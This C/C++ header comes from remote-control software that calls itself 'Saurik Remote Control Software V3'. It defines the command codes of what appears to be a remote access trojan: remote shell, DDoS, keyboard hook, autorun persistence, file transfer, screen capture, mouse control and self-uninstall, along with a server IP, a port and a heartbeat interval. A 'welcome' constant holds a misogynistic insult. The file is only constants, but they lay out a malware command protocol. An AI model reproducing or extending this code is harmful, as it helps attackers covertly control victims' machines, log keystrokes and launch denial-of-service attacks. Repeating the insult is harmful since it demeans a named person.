#pragma once

// 作者：Saurik https://www.myocean.net/

/*
*                    GNU GENERAL PUBLIC LICENSE
*                       Version 3, 29 June 2007
*
* Copyright (C) 2007 Free Software Foundation, Inc. <http://fsf.org/>
* Everyone is permitted to copy and distribute verbatim copies
* of this license document, but changing it is not allowed.
* 
* Saurik Remote Control Software V3 is under a GPLv3 Licence. You can share or change those code under licence.
*/

#define Shell_Method 100ULL
#define Get_Last_Msg 101ULL
#define Load_Lib 102ULL
#define Uninstall_Me 103ULL
#define Set_Client_ID 104ULL
#define Ddos_Method 1001ULL
#define File_Upload 1002ULL
#define File_Download 1003ULL
#define KeyBHook 1004ULL
#define Auto_Run 1005ULL
#define File_List 1006ULL
#define Remote_Screen 1007ULL

// 端口
#define S_Port 10230
#define NEEDDOMAIN 1
// 服务端IP地址（反射）
#define Server_IP "192.168.199.188"
#define Server_Host "localhost"
// 心跳包、接收时间（毫秒）
#define Wait_Time 5000
// 欢迎语
#define HELEN_IS_A_BITCH "Helen is a bitch."

// Linux
#ifndef TRUE
#define TRUE 1
#define FALSE 0
#endif

#ifdef NULL
#undef NULL
#define NULL 0
#endif

#define Pkg_Leng 10240
#define Max_WSc 1000.0
#define Max_HSc 1000.0
#define Mou_L 1000ULL
#define Mou_R 1001ULL
#define Mou_DbC 1002ULL
#define Mou_Move 1003ULL

#include <fstream>
